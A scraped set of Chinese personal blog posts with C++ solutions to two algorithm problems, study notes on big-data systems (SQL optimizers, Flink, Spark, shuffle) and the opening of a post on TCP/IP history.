[{"content":"机器人跳跃问题 机器人正在玩一个古老的基于 DOS 的游戏。\n游戏中有 N+1 座建筑——从 0到 N 编号，从左到右排列。\n编号为 0 的建筑高度为 0个单位，编号为 i的建筑高度为 H(i) 个单位。\n起初，机器人在编号为 0的建筑处。\n每一步，它跳到下一个（右边）建筑。\n假设机器人在第 k个建筑，且它现在的能量值是 E，下一步它将跳到第k+1 个建筑。\n如果 H(k+1)\u0026gt;E，那么机器人就失去 H(k+1)−E 的能量值，否则它将得到E−H(k+1) 的能量值。\n游戏目标是到达第 N 个建筑，在这个过程中能量值不能为负数个单位。\n现在的问题是机器人至少以多少能量值开始游戏，才可以保证成功完成游戏？\n输入格式 第一行输入整数 N。\n第二行是 N个空格分隔的整数，H(1),H(2),…,H(N)代表建筑物的高度。\n输出格式 输出一个整数，表示所需的最少单位的初始能量值上取整后的结果。\n数据范围 1≤N,H(i)≤1e5,\n输入样例1： 1 2  5 3 4 3 2 4   输出样例1： 1  4   输入样例2： 1 2  3 4 4 4   输出样例2： 1  4   输入样例3： 1 2  3 1 6 4   输出样例3： 1  3   分析 不论往高处跳和往低处跳，下一台阶机器人的能量都为2*E-H[i] 。可知 E越大 ，能量越大 ，可得出具有单调性 ，可以用二分做。\n数据范围为1e5，n^2暴力算法将超时\n代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  #include\u0026lt;bits/stdc++.h\u0026gt;using namespace std; const int N = 1e5+5; int h[N]; int n; bool check(int x){  for (int i = 0; i \u0026lt; n; i ++ ){  x = 2*x-h[i];  if(x\u0026lt;0){  return false;  }  if(x\u0026gt;=1e5) return true;//重点，如不加此判断x将会溢出，溢出到负数小于0，走上个if逻辑，结果将会出错  }  return true; } int main() {   cin\u0026gt;\u0026gt;n;  for (int i = 0; i \u0026lt; n; i ++ ){  cin\u0026gt;\u0026gt;h[i];  }  int l =0,r=1e5;  while(l\u0026lt;r){ //经典二分  int mid = l+r\u0026gt;\u0026gt;1;  if(check(mid)) r= mid;  else l=mid+1;  }  cout\u0026lt;\u0026lt;l\u0026lt;\u0026lt;endl;  return 0; }   有趣的数 我们把一个数称为有趣的，当且仅当：\n 它的数字只包含 0,1,2,3，且这四个数字都出现过至少一次。 所有的 0 都出现在所有的 1 之前，而所有的 2 都出现在所有的 3 之前。 最高位数字不为 0。  因此，符合我们定义的最小的有趣的数是 2013。\n除此以外，4 位的有趣的数还有两个：2031 和 2301。\n请计算恰好有 n 位的有趣的数的个数。\n由于答案可能非常大，只需要输出答案除以 1e9+7 的余数。\n输入格式 输入只有一行，包括恰好一个正整数 n。\n输出格式 输出只有一行，包括恰好 n 位的整数中有趣的数的个数除以 1e9+7的余数。\n数据范围 4≤n≤1000\n输入样例： 1  4   输出样例： 1  3   分析 对于条件 2 把条件 2 划分为两类\n0.1 设有 k 位 2.3 设有 n−k 位\n由于最高位不是 0 ，所以0在1之前不可以在第一位\n因为四个数字至少出现一次，所以 k 最多只能有 n−2 位 于是我们得到了 k 的范围 k≥2 and k≤n−2，所以2≤k≤n−2\n对于条件 2 的每一类 我们再对 kk位的 0 1 数进行分类\n设 0 的个数为 a 个，那么，1 的个数就是 k−a 个 由于每个数至少出现一次，所以 a的范围是 1≤a≤k−1 所以，k 位的 0 1 数总共有 k−1种选法 n−k 的 2 3 数同理，总共有 n−k−1 种选法 →→ 可以根据 0 1 数的选法获得\n计算答案 对于每一个 k(2≤k≤n−2)分别计算答案\nC[n - 1] [k] * (k - 1) * (n - k - 1)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  #include\u0026lt;bits/stdc++.h\u0026gt;using namespace std; int n; const int N = 1005,MOD=1e9+7; int c[N][N]; int main() {  cin\u0026gt;\u0026gt;n;  for(int i = 0;i\u0026lt;=n;i++){  for (int j = 0; j \u0026lt;=i; j ++ ){  if(j==0) c[i][j]=1;  else{  c[i][j]=(c[i-1][j]+c[i-1][j-1])%MOD;  }  }  }  int res=0;  for (int i = 2; i \u0026lt;= n-2; i ++ ){  res=(res+(long long)c[n-1][i]*(i-1)%MOD*(n-i-1))%MOD;  }  cout\u0026lt;\u0026lt;res\u0026lt;\u0026lt;endl;  return 0; }   ","permalink":"https://kevinerr.github.io/posts/life/20220728/","summary":"机器人跳跃问题 机器人正在玩一个古老的基于 DOS 的游戏。 游戏中有 N+1 座建筑——从 0到 N 编号，从左到右排列。 编号为 0 的建筑高度为 0个单位，编号为 i的建","title":"20220728"},{"content":"SQL Optimizer 解析 https://bytedance.feishu.cn/file/boxcn9uWBTLWg2a8GIUSRJ0Txqb\nhttps://live.juejin.cn/4354/yc_SQL\nhash join和sort merge join：https://blog.csdn.net/lp284558195/article/details/80717219\n大数据体系和SQL SQL 的一生     Parser  把文本变成抽象语法树结构（AST） 涉及词法分析阶段（拆分字符串，提取关键字，字符串，数值等）和语法分析阶段（把词条按照定义的语法规则组装成抽象语法树结构） 和编译原理课程里的“前端”知识相关   Analyzer  访问库/表元信息并绑定 判断 SQL 是否合理，比如数据库，表和列名是否存在，列的数据类型是否正确 将 AST 转换成逻辑计划树（在某些系统中这个工作由一个 Converter 完成）      逻辑计划树\n 所谓逻辑计划树，可以理解为逻辑地描述一个 SQL 如何一步步地执行查询和计算，最终得到执行结果的一个分步骤地计划。树中每个节点是是一个算子，定义了对数据集合的计算操作（过滤，排序，聚合，连接），边代表了数据的流向，从孩子节点流向父节点。之所以称它为逻辑的，是因为算子定义的是逻辑的计算操作，没有指定实际的算法，比如对于逻辑的排序算子，逻辑计划树里没有指定使用快排还是堆排。    查询优化\n SQL 是一种声明式语言，用户只描述做什么，没有告诉数据库怎么做 查询优化的目标是为 SQL 找到一个正确的且执行代价最小的执行计划 查询优化器是数据库的大脑，最复杂的模块，很多相关问题都是 NP 的 一般 SQL 越复杂，Join 的表越多，数据量越大，查询优化的意义就越大，因为不同执行方式的性能差别可能有成百上千倍  类比 gcc/g++ 编译程序时的编译级别（-O1, -O2, -O3），经过编译优化的程序运行效率更高      物理执行计划\n 优化器的输出是一个分布式的物理执行计划。 分布式物理执行计划的目标是在单机 Plan 的基础上最小化数据移动和最大化本地 Scan，生成 PlanFragment 树。 一个 PlanFragment 封装了在一台机器上对数据集的操作逻辑。每个 PlanFragment 可以在每个 executor 节点生成 1 个或多个执行实例，不同执行实例处理不同的数据集，通过并发来提升查询性能。 Plan 分布式化的方法是增加 shuffle 算子，执行计划树会以 shuffle 算子为边界拆分为PlanFragment。    Executor\n Executor 按照物理执行计划扫描和处理数据，充分利用机器资源（CPU 流水线，乱序执行，cache，SIMD）    常见的查询优化器 RBO Rule-based Optimizer\n 基于关系代数等价规则对逻辑计划进行变换 实现上：  Pattern：定义了特定结构的 Operator 子树（结构） Rule：定义了如何将其匹配的节点替换（Substitute）为新形态，从而生成新的、等价的Operator 树（原地替换） 优化器搜索过程被抽象为不断匹配 Pattern 然后应用 Rule 转换，直到没有可以匹配的 rule   局限性：  无法解决多表连接问题 无法确定和选择最优的分布式 Join/Aggregate 执行方式    列裁剪 scan时只扫描select选中的列\n谓词下推 如有where条件，在scan时就过滤掉\n传递闭包 如有jion on条件，可将一个表的where scan 传递给另一个表的 where scan\nRuntime Filter（min-max filter，in-list filter，bloom filter） jion前2个表都有filter，可将一个表filter后的一些索引特性在运行时传递给另一个表，这是另一个表进行filter时就可以减少很大一部分数据\nJoin 消除 谓词合并 小结 主流RBO实现一般都有几百条基于经验归纳得到的优化规则\n实现简单，优化速度块，但不能保证最优的执行计划\nCBO Cost-based Optimizer\n过程 使用一个模型估算执行计划的代价，选择代价最小的执行计划\n分而治之，执行计划的代价等于所有算子的执行代价之和\n通过 RBO 得到（所有）可能的等价执行计划（非原地替换）\n算子代价包含 CPU，cache misses，memory，disk I/O，network I/O 等代价\n 和算子的统计信息有关，比如输入、输出结果的行数，每行大小等 叶子算子 scan：通过统计原始表数据得到  中间算子：根据一定的推导规则，从下层算子的统计信息推导得到 和具体的算子类型，以及算子的物理实现有关（e.g. hash join vs. sort join）    使用动态规划枚举所有执行计划，选出执行代价最小的执行计划\n统计信息  基表统计信息  表或者分区级别：行数、行平均大小、表在磁盘中占用了多少字节等 列级别：min、max、num nulls、num、not nulls、num、distinct value(NDV)、histogram 等   推导统计信息  选择率（selectivity） ：对于某一个过滤条件，查询会从表中返回多大比例的数据 基数（cardinality） ：基本含义是表的 unique 行数，在查询计划中常指算子需要处理的行数    统计信息的收集方式 三种\n统计信息推导规则 统计信息的问题 小结 CBO使用代价模型和统计信息估算执行计划的代价\nCBO使用贪心或者动态规划算法寻求最优执行计划\n社区开源实践 Apache Calcite 主流的查询优化器都包含RBO/CBO\nApache Calcite是大数据领域很流行的查询优化器\nApache Calcite RBO定义了很多优化规则，使用pattern匹配子树，执行等价变换\nApache Calcite CBO基于Volcano/Cascade 框架\nVolcano/Cascade的精髓Memo、动态规划、剪枝\n前沿趋势 存储计算分离\nHSAP, HTAP, HTSAP\nCloud Native, Serverless\n数据仓库，数据湖，湖仓一体，联邦查询\n智能化\n AI4DB  自配置：智能调参（OtterTune，QTune）、负载预测、负载调度 自诊断和自愈合：软硬件错误、错误恢复和迁移 自优化：统计信息估计（ Learned cardinalities ）、代价估计、学习型优化器（IBM DB2 LEO），索引推荐，视图推荐   DB4AI  内嵌人工智能算法（MLSQL，SQLFlow） 内嵌机器学习框架（SparkML， Alink， dl-on-flink ）    流/批/OLAP 一体的 Flink 引擎介绍 https://bytedance.feishu.cn/file/boxcni8teJOjd4vUsgxn8rL0ylc\nhttps://live.juejin.cn/4354/yc_OLAP\nApache Flink 概述 批处理 所谓 批处理 是指把一项数据处理任务先分解成更小粒度的任务，把这些任务分布在集群中的各台实例上进行计算，之后把各实例上的计算结果重新计算和组合成最终结果。批处理系统通常会操作大量的静态的数据，并等到这些数据全部处理完成后才能得到返回的结果。\n批处理方式使用的数据集通常有以下特征：\n 有界：批处理数据集代表数据的有限集合 持久：数据通常始终存储在某种类型的持久存储位置中 大量：批处理操作通常是处理极为海量数据集的唯一方法  流处理 流处理 方式会随时对进入系统的数据进行实时的计算，这种模式不需要针对整个数据集执行操作，而是对通过系统传输的每个数据项执行操作。流处理中的数据集是 无边界 的，这就产生了几个重要的影响：\n 完整数据集只能代表截至目前已经进入到系统中的数据总量。 工作数据集也许更相关，在特定时间只能代表某个单一数据项。 处理工作是基于事件的，除非明确停止否则没有“尽头”。处理结果立刻可用，并会随着新数据的抵达继续更新。  混合处理 在大数据处理技术中流派中，除了单纯的批处理和流处理模式之外，还有一些处理框架既可以进行批处理也可以进行流处理，我们称之为混合处理框架。虽然专注于一种处理方式可能非常适合特定场景，但是混合框架为数据处理提供了通用的解决方案。这些框架可以用相同或相关的组件和 API 处理两种类型的数据，借此让不同的处理需求得以简化。混合处理框架中目前比较著名的就是 Spark 和 Flink 。\n为什么 Flink 会脱颖而出 完全一次保证：故障后应正确恢复有状态运算符中的状态；\n低延迟：越低越好。许多应用程序需要亚秒级延迟；\n高吞吐量：随着数据速率的增长，通过管道推送大量数据至关重要；\n强大的计算模型：框架应该提供一种编程模型，该模型不限制用户并允许各种各样的应用程序在没有故障的情况下，容错机制的开销很低；\n流量控制：来自慢速算子的反压应该由系统和数据源自然吸收，以避免因消费者缓慢而导致崩溃或降低性能；\n乱序数据的支持：支持由于其他原因导致的数据乱序达到、延迟到达后，计算出正确的结果；\n完备的流式语义：支持窗口等现代流式处理语义抽象；\nGoogle Dataflow Model 的开源引擎实现。\nApache Flink 开源生态 Apache Flink 在开源生态上的能力比较强大，可以支持：\n流批一体：支持流式计算和批式计算；\nOLAP：Flink 可以支持 OLAP 这种短查询场景；\nFlink ML：pyFlink、ALink、AIFlow 等生态支持 Flink 在 ML 场景的应用；\nGelly：图计算；\nStateful Function：支持有状态的 FAAS 场景；\nFlink 整体架构 Flink 分层架构   SDK 层：Flink\u0026rsquo;s APIs Overview；\n  执行引擎层（Runtime 层）：执行引擎层提供了统一的 DAG，用来描述数据处理的 Pipeline，不管是流还是批，都会转化为 DAG 图，调度层再把 DAG 转化成分布式环境下的 Task，Task 之间通过 Shuffle 传输数据；\n 调度：Jobs and Scheduling； Task 生命周期：Task Lifecycle； Flink Failover 机制：Task Failure Recovery； Flink 反压概念及监控：Monitoring Back Pressure； Flink HA 机制：Flink HA Overview；    状态存储层：负责存储算子的状态信息\n  Flink 整体架构   JobManager（JM）负责整个任务的协调工作，包括：调度 task、触发协调 Task 做 Checkpoint、协调容错恢复等，核心有下面三个组件：\n Dispatcher: 接收作业，拉起 JobManager 来执行作业，并在 JobMaster 挂掉之后恢复作业； JobMaster: 管理一个 job 的整个生命周期，会向 ResourceManager 申请 slot，并将 task 调度到对应 TM 上； ResourceManager：负责 slot 资源的管理和调度，Task manager 拉起之后会向 RM 注册；    TaskManager（TM）：负责执行一个 DataFlow Graph 的各个 task 以及 data streams 的 buffer 和数据交换。\n  Flink 如何做到流批一体 批式计算是流式计算的特例，Everything is Streams，有界数据集（批式数据）也是一种数据流、一种特殊的数据流；\n站在 Flink 的角度，Everything is Streams，无边界数据集是一种数据流，一个无边界的数据流可以按时间切段成一个个有边界的数据集，所以有界数据集（批式数据）也是一种数据流。因此，不管是有边界的数据集（批式数据）还是无边界数据集，Flink 都可以天然地支持，这是 Flink 支持流批一体的基础。并且 Flink 在流批一体上，从上面的 API 到底层的处理机制都是统一的，是真正意义上的流批一体。\nApache Flink 主要从以下几个模块来做流批一体：\n SQL 层； DataStream API 层统一，批和流都可以使用 DataStream API 来开发； Scheduler 层架构统一，支持流批场景； Failover Recovery 层 架构统一，支持流批场景； Shuffle Service 层架构统一，流批场景选择不同的 Shuffle Service；  Flink 架构优化 Flink 如何支持 OLAP 场景 Flink 做 OLAP 的优势\n 统一引擎：流处理、批处理、OLAP 统一使用 Flink 引擎；  降低学习成本，仅需要学习一个引擎； 提高开发效率，很多 SQL 是流批通用； 提高维护效率，可以更集中维护好一个引擎；   既有优势：利用 Flink 已有的很多特性，使 OLAP 使用场景更为广泛；  使用流处理的内存计算、Pipeline； 支持代码动态生成； 也可以支持批处理数据落盘能力；   相互增强：OLAP 能享有现有引擎的优势，同时也能增强引擎能力  无统计信息场景的优化； 开发更高效的算子； 使 Flink 同时兼备流、批、OLAP 处理的能力，成为更通用的框架。    Flink OLAP 场景的挑战\n  秒级和毫秒级的小作业；\n  作业频繁启停、资源碎片；\n Flink OLAP 计算相比流式和批式计算，最大的特点是 Flink OLAP 计算是一个面向秒级和毫秒级的小作业，作业在启动过程中会频繁申请内存、网络以及磁盘资源，导致 Flink 集群内产生大量的资源碎片；    Latency + 高 APS 要求；\n OLAP 最大的特点是查询作业对 Latency 和 QPS 有要求的，需要保证作业在 Latency 的前提下提供比较高的并发调度和执行能力，这就对 Flink 引擎提出了一个新的要求。    Flink OLAP 架构现状\n Client：提交 SQL Query； Gateway：接收 Client 提交的 SQL Query，对 SQL 进行语法解析和查询优化，生成 Flink 作业执行计划，提交给 Session 集群； Session Cluster：执行作业调度及计算，并返回结果。  JobManager 管理作业的执行，在接收到 Gateway 提交过来的作业逻辑执行计划后，将逻辑执行计划转换为物理执行计划，为每个物理计算任务分配资源，将每个计算任务分发给不同的 TaskManager 执行，同时管理作业以及每个计算任务执行状态； TaskManager执行具体的计算任务，采用线程模型，为每个计算任务创建计算线程，根据计算任务的上下游数据依赖关系跟上游计算任务建立/复用网络连接，向上游计算任务发送数据请求，并处理上游分发给它的数据。      Flink 在 OLAP 架构上的问题与设想\n 架构与功能模块：  JobManager 与 ResourceManager 在一个进程内启动，无法对JobManager 进行水平扩展； Gateway 与 Flink Session Cluster 互相独立，无法进行统一管理；   作业管理及部署模块：  JobManager 处理和调度作业时，负责的功能比较多，导致单作业处理时间长、并占用了过多的内存； TaskManager 部署计算任务时，任务初始化部分耗时验证，消耗大量 CPU；   资源管理及计算任务调度：  资源申请及资源释放流程链路过长； Slot 作为资源管理单元，JM 管理 slot 资源，导致 JM 无法感知到 TM 维度的资源分布，使得资源管理完全依赖于 ResourceManager；   其他：  作业心跳与 Failover 机制，并不合适 AP 这种秒级或毫秒级计算场景； AP 目前使用 Batch 算子进行计算，这些算子初始化比较耗时；    精选案例讲解 Exactly Once 语义在 Flink 中的实现 https://bytedance.feishu.cn/file/boxcnFPburXr95rMNel1SHOvISg\nhttps://live.juejin.cn/4354/yc_Once\n数据流和动态表   如何在实时数据流中定义 SQL 语义中的表？\n 动态表 ： 随时间不断变化的表，在任意时刻，可以像查询静态批处理表一样查询它们    实时流的查询特点？\n 查询从不终止 查询结果会不断更新，并且会产生一个新的动态表 结果的动态表也可转换成输出的实时流    动态表到实时流的转换\n Append-only Stream: Append-only 流（只有 INSERT 消息） Retract Stream: Retract 流（同时包含 INSERT 消息和 DELETE 消息） Upsert Stream:: Upsert 流（同时包含 UPSERT 消息和 DELETE 消息）    算子状态\n在流式计算中，会存在有状态的计算逻辑（算子）\n比如，需要计算某个用户在网上的点击量，该用户在网站当前的总点击次数就是算子状态，对于新的输入数据，先判断是否是该用户的点击行为，如果是，则将保留的点击次数（状态）增加一，并将当前累加结果输出。\nExactly-Once 和 Checkpoint 一致性保证语义   At-most-once：每条数据消费至多一次，处理延迟低\n  At-least-once：每条数据消费至少一次，一条数据可能存在重复消费\n  Exactly-once：每条数据都被消费且仅被消费一次，仿佛故障从未发生\n  端到端 Exactly-Once 实现 Chandy-Lamport算法 解耦了快照制作和数据处理过程，各个算子制作完成状态快照后就可以正常处理数据，不用等下游算子制作制作完成快照； 在快照制作和 Barrier Alignment 过程中需要暂停处理数据，仍然会增加数据处理延迟； 快照保存到远端也有可能极为耗时。\nCheckpoint 能保证每条数据都对各个有状态的算子更新一次，sink 输出算子仍然可能下发重复的数据； 严格意义的端到端的 Exactly-once 语义需要特殊的 sink 算子实现。\n两阶段提交协议（2PC）   Coordinator：协作者，同步和协调所有节点处理逻辑的中心节点\n  Participant：参与者，被中心节点调度的其他执行处理逻辑的业务节点\n  事务开启：在 sink task 向下游写数据之前，均会开启一个事务，后续所有写数据的操作均在这个事务中执行，事务未提交前，事务写入的数据下游不可读； 预提交阶段：JobManager 开始下发 Checkpoint Barrier，当各个处理逻辑接收到 barrier 后停止处理后续数据，对当前状态制作快照，此时 sink 也不在当前事务下继续处理数据（处理后续的数据需要新打开下一个事务）。状态制作成功则向 JM 成功的消息，失败则发送失败的消息； 提交阶段：若 JM 收到所有预提交成功的消息，则向所有处理逻辑（包括 sink）发送可以提交此次事务的消息，sink 接收到此消息后，则完成此次事务的提交，此时下游可以读到这次事务写入的数据；若 JM 有收到预提交失败的消息，则通知所有处理逻辑回滚这次事务的操作，此时 sink 则丢弃这次事务提交的数据下。\nFlink 案例讲解 流式计算中的 Window 计算 https://zhuanlan.zhihu.com/p/102484347\nhttps://bytedance.feishu.cn/file/boxcn5expS9gYOnxpZUBayXPwVg\nhttps://live.juejin.cn/4354/yc_Window\nWatermark Watermark定义：当前系统认为的事件时间所在的真实时间。\n简单来说 Watermark 是一个时间戳，表示已经收集完毕的数据的最大 event time，换句话说 event time 小于 Watermark 的数据不应该再出现，基于这个前提我们才有可能将 event time 窗口视为完整并输出结果。\n  怎么观察一个任务中的watermark是多少，是否是正常的\n 一般通过Flink Web UI上的信息来观察当前任务的watermark情况 这个问题是生产实践中最容易遇到的问题，大家在开发事件时间的窗口任务的时候，经常会忘记了设置watermark，或者数据太少，watermark没有及时的更新，导致窗口一直不能触发。    如果有部分partition/subtask会断流，应该如何处理\n 数据断流是很常见的问题，有时候是业务数据本身就有这种特点，比如白天有数据，晚上没有数据。在这种情况下，watermark默认是不会更新的，因为它要取上游subtask发来的watermark中的最小值。此时我们可以用一种IDLE状态来标记这种subtask，被标记为这种状态的subtask，我们在计算watermark的时候，可以把它先排除在外。这样就可以保证有部分partition断流的时候，watermark仍然可以继续更新。    算子对于时间晚于watermark的数据的处理\n 对于迟到数据，不同的算子对于这种情况的处理可以有不同的实现（主要是根据算子本身的语义来决定的） 比如window对于迟到的数据，默认就是丢弃；比如双流join，对于迟到数据，可以认为是无法与之前正常数据join上。    Window TUMBLE Window （滚动窗口） HOP Window （滑动窗口） SESSION Window （会话窗口） 迟到数据处理 根据上面说到的watermark原理，watermark驱动某个窗口触发输出之后，这个窗口如果后面又来了数据，那这种情况就属于是迟到的数据了。（注意，不是数据的时间晚于watermark就算是迟到，而是它所属的窗口已经被触发了，才算迟到）。\n对于迟到的数据，我们现在有两种处理方式：\n  使用side output方式，把迟到的数据转变成一个单独的流，再由用户自己来决定如何处理这部分数据\n  直接drop掉\n  注意：side output只有在DataStream的窗口中才可以用，在SQL中目前还没有这种语义，所以暂时只有drop这一个策略。\n增量计算 VS 全量计算   增量计算：每条数据到来后，直接参与计算（但是还不需要输出结果）\n  全量计算：每条数据到来后，先放到一个buffer中，这个buffer会存储到状态里，直到窗口触发输出的时候，才把所有数据拿出来统一进行计算\n  EMIT触发 正常的窗口都是窗口结束的时候才会进行输出,EMIT触发就是在这种情况下，可以提前把窗口内容输出出来的一种机制。比如我们可以配置一个1天的窗口，每隔5s输出一次它的最新结果，那这样下游就可以更快的获取到窗口计算的结果了。\n这种emit的场景就是一个典型的retract的场景，发送的结果类似于+[1], -[1], +[2], -[2], +[4]这样子。这样才能保证window的输出的最终结果是符合语义的。\nWindow Offset 滑动窗口的时间戳是按照unix timestamp来算的。比如我们要用一个一周的窗口，想要的是从周一开始，到周日结束，但是按照上面这种方式计算出来的窗口的话，就是从周四开始的\nWindow 高级优化 Mini-batch 赞一小批数据再进行计算，这批数据每个key的state访问只有一次，这样在单个key的数据比较集中的情况下，对于状态访问可以有效的降低频率，最终提升性能。\nLocal-global 所谓的local-global，就是将原本的聚合划分成两阶段，第一阶段先做一个local的聚合，这个阶段不需要数据shuffle，是直接跟在上游算子之后进行处理的；第二个阶段是要对第一个阶段的结果做一个merge\nDistinct状态复用 对于distinct的优化，一般批里面的引擎都是通过把它优化成aggregate的方式来处理，但是在流式window中，我们不能直接这样进行优化，要不然算子就变成会下发retract的数据了。\n滑动窗口pane复用 将窗口的状态划分成更小粒度的pane，比如上面3小时窗口、1小时滑动的情况，可以把pane设置为1h，这样每来一条数据，我们就只更新这条数据对应的pane的结果就可以了。当窗口需要输出结果的时候，只需要将这个窗口对应的pane的结果merge起来就可以了。\nSpark 原理与实践 https://www.bilibili.com/video/BV11A411L7CK\nhttps://zhuanlan.zhihu.com/p/34436165\nhttps://bytedance.feishu.cn/file/boxcnvEmKZp3gR3Q1swBBrrxDJb\nhttps://live.juejin.cn/4354/yc_Spark\n大数据处理引擎Spark介绍 Spark下载编译 1、官网download\n2、查看运行是需要的依赖、参数配置等等\n1  tree . -L 1   3、查看客户端的命令\n1  tree ./bin -L 1   Spark运行架构和工作原理 Spark生态组件：\n  Spark Core：Spark核心组件，它实现了Spark的基本功能，包含任务调度、内存管理、错误恢复、与存储系统交互等模块。\n  Spark SQL：用来操作结构化数据的核心组件，通过Spark SQL可以直接查询Hive、HBase等多种外部数据源中的数据。\n  Spark Structured Streaming：Spark提供的流式计算框架，支持高吞吐量、可容错处理的实时流式数据处理。\n  MLlib：Spark提供的关于机器学习功能的算法程序库，包括分类、回归、聚类、协同过滤算法等，还提供了模型评估、数据导入等额外的功能。\n  GraphX：Spark提供的分布式图处理框架，拥有对图计算和图挖掘算法的API接口以及丰富的功能和运算符。\n  独立调度器、Yarn、Mesos、Kubernetes：Spark框架可以高效地在一个到数千个节点之间伸缩计算，集群管理器则主要负责各个节点的资源管理工作，为了实现这样的要求，同时获得最大灵活性，Spark支持在各种集群管理器（Cluster Manager）上运行。\n  Spark 运行架构和工作原理：\n  Application（应用）：Spark上运行的应用。Application中包含了一个驱动器（Driver）进程和集群上的多个执行器（Executor）进程。\n  Driver Program（驱动器）：运行main()方法并创建SparkContext的进程。\n  Cluster Manager（集群管理器）：用于在集群上申请资源的外部服务（如：独立部署的集群管理器、Mesos或者Yarn）。\n  Worker Node（工作节点）：集群上运行应用程序代码的任意一个节点。\n  Executor（执行器）：在集群工作节点上为某个应用启动的工作进程，该进程负责运行计算任务，并为应用程序存储数据。\n  Task（任务）：执行器的工作单元。\n  Job（作业）：一个并行计算作业，由一组任务（Task）组成，并由Spark的行动（Action）算子（如：save、collect）触发启动。\n  Stage（阶段）：每个Job可以划分为更小的Task集合，每组任务被称为Stage。\n  Spark目前支持几个集群管理器：\n  Standalone ：Spark 附带的简单集群管理器，可以轻松设置集群。\n  Apache Mesos：通用集群管理器，也可以运行 Hadoop MapReduce 和服务应用程序。（已弃用）\n  Hadoop YARN： Hadoop 2 和 3 中的资源管理器。\n  Kubernetes：用于自动部署、扩展和管理容器化应用程序的开源系统。\n  SparkCore RDD(Resilient Distributed Dataset)：弹性分布式数据集，是一个容错的、并行的数据结构\nRDD算子：对任何函数进行某一项操作都可以认为是一个算子，RDD算子是RDD的成员函数\nTransform(转换)算子: 根据已有RDD创建新的RDD\nAction(动作)算子: 将在数据集上运行计算后的数值返回到驱动程序，从而触发真正的计算\nDAG(Directed Acyclic Graph): 有向无环图，Spark中的RDD通过一系列的转换算子操作和行动算子操作形成了一个DAG\nDAGScheduler：将作业的DAG划分成不同的Stage，每个Stage都是TaskSet任务集合，并以TaskSet为单位提交给TaskScheduler。\nTaskScheduler：通过TaskSetManager管理Task，并通过集群中的资源管理器（Standalone模式下是Master，Yarn模式下是ResourceManager）把Task发给集群中Worker的Executor\nShuffle：Spark中数据重分发的一种机制。\nSparkSQL DataFrame： 是一种以RDD为基础的分布式数据集， 被称为SchemaRDD\nCatalyst：SparkSQL核心模块，主要是对执行过程中的执行计划进行处理和优化\nDataSource：Spark\u0008SQL支持通过 DataFrame 接口对各种数据源进行操作。\nAdaptive Query Execution：自适应查询执行\nRuntime Filter：运行时过滤\nCodegen：生成程序代码的技术或系统，可以在运行时环境中独立于生成器系统使用\nSparkSql执行过程：\n  Unresolved Logical Plan：未解析的逻辑计划，仅仅是数据结构，不包含任何数据信息。\n  Logical Plan：解析后的逻辑计划，节点中绑定了各种优化信息。\n  Optimized Logical Plan：优化后的逻辑计划\n  Physical Plans：物理计划列表\n  Selected Physical Plan 从列表中按照一定的策略选取最优的物理计划\n  业界挑战与实践 向量化(vectorization)：将循环转换为向量操作的编译器优化\n代码生成(Codegen：Code generation)：生成程序代码的技术或系统，可以在运行时环境中独立于生成器系统使用\n大数据 Shuffle 原理与实践 https://bytedance.feishu.cn/file/boxcnQaV9uaxTp4xF0d1vEK5W3c\nhttps://live.juejin.cn/4354/yc_Shuffle\nshuffle概述 https://www.cnblogs.com/lintong-zf/p/14231356.html\n所谓shuffle就是指把数据打乱重新组合。指数据从map task输出到reduce task输入的这段过程。\nMapreduce  map阶段：在单机上进行的针对一小块数据的计算 shuffle阶段：在map阶段的基础上，进行数据移动 reduce阶段：对移动后的数据进行处理，依然是在单机上处理一小份数据  为什么shuffle如此重要  数据shuffle表示了不同分区数据交换的过程，不同的shuffle策略性能差异较大。目前在各个引擎中shuffle都是优化的重点，在spark框架中，shuffle是支撑spark进行大规模复杂数据处理的基石。  shuffle算子 常见的触发shuffle的算子\n  repartition\n coalesce、repartition  重分区一般会shuffle，因为需要在整个集群中，对之前所有的分区的数据进行随机，均匀的打乱，然后把数据放入下游新的指定数量的分区内。\n  ByKey\n groupByKey、reduceByKey、aggregateByKey、combineByKey、sortByKeysortBy  byKey类的操作要对一个key，进行聚合操作，那么肯定要保证集群中，所有节点上的相同的key，移动到同一个节点上进行处理。\n  Join\n cogroup、join  两个rdd进行join，就必须将相同join key的数据，shuffle到同一个节点上，然后进行相同key的两个rdd数据的笛卡尔乘积。\n  shuffle过程 HashShuffle\n 优点：不需要排序 缺点：打开，创建的文件过多  SortShuffle\n 优点：打开的文件少、支持map-side combine 缺点：需要排序  TungstenSortShuffle\n 优点：更快的排序效率，更高的内存利用效率 缺点：不支持map-side combine  push shuffle ","permalink":"https://kevinerr.github.io/posts/tech/%E5%AD%97%E8%8A%82%E5%A4%A7%E6%95%B0%E6%8D%AE/","summary":"SQL Optimizer 解析 https://bytedance.feishu.cn/file/boxcn9uWBTLWg2a8GIUSRJ0Txqb https://live.juejin.cn/4354/yc_SQL hash join和sort merge join：https://blog.csdn.net/lp284558195/article/detail","title":"字节大数据"},{"content":"2、TCP/IP 历史与分层模型 目前 TCP/IP 协议可以说是名气最大、使用最广泛的计算机网络，从这篇文章来会讲解 TCP 协议的历史和分层模型。将分以下两个部分\n TCP/IP 协议产生的历史背景 TCP/IP 协议的分层模型  接下来我们来讲讲 TCP/IP 协议的历史。\nTCP/IP 协议产生的历史背景 时间回退到 1969 年，当时的 Internet 还是一个美国国防部高级研究计划局（Advanced Research Projects Agency，ARPA）研究的非常小的网络，被称为 ARPANET（Advanced Research Project Agency Network）。\n比较流行的说法是美国担心敌人会摧毁他们的通信网络，于是下决心要建立一个高可用的网络，即使部分线路或者交换机的故障不会导致整个网络的瘫痪。于是 ARPA 建立了著名的 ARPANET。\nARPANET 最早只是一个单个的分组交换网，后来发展成为了多个网络的互联技术，促成了互联网的出现。现代计算机网络的很多理念都来自 ARPANET，1983 年 TCP/IP 协议成为 ARPANET 上的标准协议，使得所有使用 TCP/IP 协议的计算机都能互联，因此人们把 1983 年当做互联网诞生的元年。\n从字面上来看，很多人会认为 TCP/IP 是 TCP、IP 这两种协议，实际上TCP/IP 协议族指的是在 IP 协议通信过程中用到的协议的统称\nTCP/IP 网络分层 记得在学习计算机网络课程的时候，一上来就开始讲分层模型了，当时死记硬背的各个层的名字很快就忘光了，不明白到底分层有什么用。纵观计算机和分布式系统，你会发现「计算机的问题都可以通过增加一个虚拟层来解决，如果不行，那就两个」\n下面用 wireshark 